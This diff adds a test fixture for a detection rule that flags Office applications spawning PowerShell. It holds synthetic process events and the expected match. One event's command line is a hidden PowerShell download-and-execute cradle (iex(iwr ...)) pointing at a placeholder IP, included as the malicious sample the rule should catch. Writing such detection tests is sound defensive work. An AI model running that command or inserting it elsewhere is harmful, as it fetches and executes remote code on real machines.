@@ -1,0 +1,14 @@
+rule: detections/office-app-spawns-script-host.yaml
+description: Word starting PowerShell fires; Excel starting the print spooler helper and Explorer starting PowerShell don't.
+data:
+  DeviceProcessEvents:
+    - {ago: 10m, DeviceName: fin-ws-07, AccountName: carol, FileName: powershell.exe, ProcessCommandLine: 'powershell.exe -nop -w hidden -c iex(iwr http://198.51.100.9/a)', InitiatingProcessFileName: WINWORD.EXE, InitiatingProcessCommandLine: '"WINWORD.EXE" /n "C:\Users\carol\Downloads\Invoice.docm"'}
+    - {ago: 10m, DeviceName: fin-ws-08, AccountName: dave, FileName: splwow64.exe, ProcessCommandLine: 'splwow64.exe 8192', InitiatingProcessFileName: EXCEL.EXE}
+    - {ago: 10m, DeviceName: it-ws-01, AccountName: alice, FileName: powershell.exe, ProcessCommandLine: 'powershell.exe', InitiatingProcessFileName: explorer.exe}
+expect:
+  rows: 1
+  include:
+    - {DeviceName: fin-ws-07, FileName: powershell.exe}
+  exclude:
+    - {DeviceName: fin-ws-08}
+    - {DeviceName: it-ws-01}
